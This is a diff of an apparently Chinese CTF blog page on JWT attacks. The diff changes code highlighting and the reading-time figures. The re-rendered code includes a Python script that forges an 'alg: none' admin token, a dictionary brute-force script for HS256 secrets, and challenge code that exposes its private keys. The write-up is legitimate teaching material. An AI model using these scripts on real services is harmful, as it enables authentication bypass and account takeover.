@@ -208,7 +208,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.3k 字
+      3.8k 字
     </span>
   
 
@@ -217,7 +217,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      36 分钟
+      32 分钟
     </span>
   
 
@@ -280,25 +280,25 @@ jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>携带着这个cookie访问<code>admin</code>即可</p>
 <h2 id="算法修改"><a href="#算法修改" class="headerlink" title="算法修改"></a>算法修改</h2><p>JWT支持将算法设定为”none”，如果将”alg”字段设为”none”，那么签名将会置空，将签名置空将可以伪造任何想要的token。</p>
 <p>使用python进行jwt编码：</p>
-<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwt
+<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt
 
-token_dict &#x3D; &#123;
-  &quot;iss&quot;: &quot;admin&quot;,
-  &quot;iat&quot;: 1642391959,
-  &quot;exp&quot;: 1642399159,
-  &quot;nbf&quot;: 1642391959,
-  &quot;sub&quot;: &quot;admin&quot;,
-  &quot;jti&quot;: &quot;e80ebdc089f5347ebe9d6afedc252a73&quot;
-&#125;
+token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1642391959</span><span class="token punctuation">,</span>
+  <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1642399159</span><span class="token punctuation">,</span>
+  <span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1642391959</span><span class="token punctuation">,</span>
+  <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"e80ebdc089f5347ebe9d6afedc252a73"</span>
+<span class="token punctuation">&#125;</span>
 
-headers &#x3D; &#123;
-  &quot;alg&quot;: &quot;none&quot;,
-  &quot;typ&quot;: &quot;JWT&quot;
-  &#125;
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>
+  <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span>
+  <span class="token punctuation">&#125;</span>
 
-jwt_token &#x3D; jwt.encode(token_dict,&quot;&quot;,algorithm&#x3D;&quot;none&quot;,headers&#x3D;headers)
+jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token_dict<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
 
-print(jwt_token)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <ul>
 <li>小坑：<code>headers</code>中的<code>alg</code>为<code>none</code>，在encode时，<code>algorithm</code>也必须为<code>none</code>均为小写</li>
@@ -308,27 +308,27 @@ print(jwt_token)<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <p>可通过工具对其进行爆破：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)</a></p>
 <p>或者自己写脚本爆破：</p>
-<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwt
+<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt
 
-token &#x3D; &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NDIxNSwiZXhwIjoxNjQyNDAxNDE1LCJuYmYiOjE2NDIzOTQyMTUsInN1YiI6InVzZXIiLCJqdGkiOiJkZmU5NzZmOGY3NDlhZDQ4ODk5ZjVjNTgwZDM2NmU3ZCJ9.dSpJxOw7fTEeHqGRMehKrpUypITCYL8tXBsWXkhZSKA&quot;
+token <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NDIxNSwiZXhwIjoxNjQyNDAxNDE1LCJuYmYiOjE2NDIzOTQyMTUsInN1YiI6InVzZXIiLCJqdGkiOiJkZmU5NzZmOGY3NDlhZDQ4ODk5ZjVjNTgwZDM2NmU3ZCJ9.dSpJxOw7fTEeHqGRMehKrpUypITCYL8tXBsWXkhZSKA"</span>
 
-passwd &#x3D; &quot;E:\zkuan\PythonHacker\passwd.txt&quot;
+passwd <span class="token operator">=</span> <span class="token string">"E:\zkuan\PythonHacker\passwd.txt"</span>
 
-with open(passwd) as file:
-    for line in file:
-        line &#x3D; line.strip()
-        try:
-            jwt.decode(token,verify&#x3D;True,key&#x3D;line,algorithms&#x3D;&quot;HS256&quot;)
-            print(&quot;key:&quot;,line)
-            break
-        except (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAlgorithmError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
-            print(&quot;key:&quot;,line)
-            break
-        except jwt.exceptions.InvalidSignatureError:
-            print(&quot;Failed&quot;,line)
-            continue
-    else:
-        print(&quot;NOT FOUND&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>key<span class="token operator">=</span>line<span class="token punctuation">,</span>algorithms<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">except</span> <span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAlgorithmError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ImmatureSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
+            <span class="token keyword">continue</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>将token设为自己的token值，设置自己的字典路径，即可进行爆破。</p>
 <p>将爆破出来的密钥填写进去，修改<code>sub</code>为<code>admin</code>，编码后携带此cookie访问目标。</p>
@@ -337,29 +337,29 @@ with open(passwd) as file:
 <p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117131242876.png" srcset="/img/loading.gif" lazyload alt="image-20220117131242876"></p>
 <p>爆破出密钥<code>aaab</code></p>
 <h2 id="公私钥泄露"><a href="#公私钥泄露" class="headerlink" title="公私钥泄露"></a>公私钥泄露</h2><p>根据提示，</p>
-<div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#x2F;* GET home page. *&#x2F;
-router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
-  res.type(&#39;html&#39;);
-  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);
-  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);
-  res.cookie(&#39;auth&#39;,token);
-  res.end(&#39;where is flag?&#39;);
+<div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token comment">/* GET home page. */</span>
+router.get('/'<span class="token punctuation">,</span> function(req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next) <span class="token punctuation">&#123;</span>
+  res.type('html');
+  var privateKey = fs.readFileSync(process.cwd()+'<span class="token comment">//public//private.key');</span>
+  var token = jwt.sign(<span class="token punctuation">&#123;</span> user<span class="token operator">:</span> 'user' <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token operator">:</span> 'RS256' <span class="token punctuation">&#125;</span>);
+  res.cookie('auth'<span class="token punctuation">,</span>token);
+  res.end('where is flag?');
   
-&#125;);
+<span class="token punctuation">&#125;</span>);
 
-router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;
-	var flag&#x3D;&quot;flag_here&quot;;
-	res.type(&#39;html&#39;);
-	var auth &#x3D; req.cookies.auth;
-	var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public key
-	jwt.verify(auth, cert, function(err, decoded) &#123;
-	  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;
+router.post('/'<span class="token punctuation">,</span>function(req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next)<span class="token punctuation">&#123;</span>
+	var flag=<span class="token string">"flag_here"</span>;
+	res.type('html');
+	var auth = req.cookies.auth;
+	var cert = fs.readFileSync(process.cwd()+'<span class="token comment">//public/public.key');  // get public key</span>
+	jwt.verify(auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> function(err<span class="token punctuation">,</span> decoded) <span class="token punctuation">&#123;</span>
+	  if(decoded.user==='admin')<span class="token punctuation">&#123;</span>
 	  	res.end(flag);
-	  &#125;else&#123;
-	  	res.end(&#39;you are not admin&#39;);
-	  &#125;
-	&#125;);
-&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+	  <span class="token punctuation">&#125;</span>else<span class="token punctuation">&#123;</span>
+	  	res.end('you are not admin');
+	  <span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>);
+<span class="token punctuation">&#125;</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>为公私钥泄露，访问<code>/public.key</code>和<code>/private.key</code>将公私钥下载下来。</p>
 <p>本地搭建环境进行测试</p>
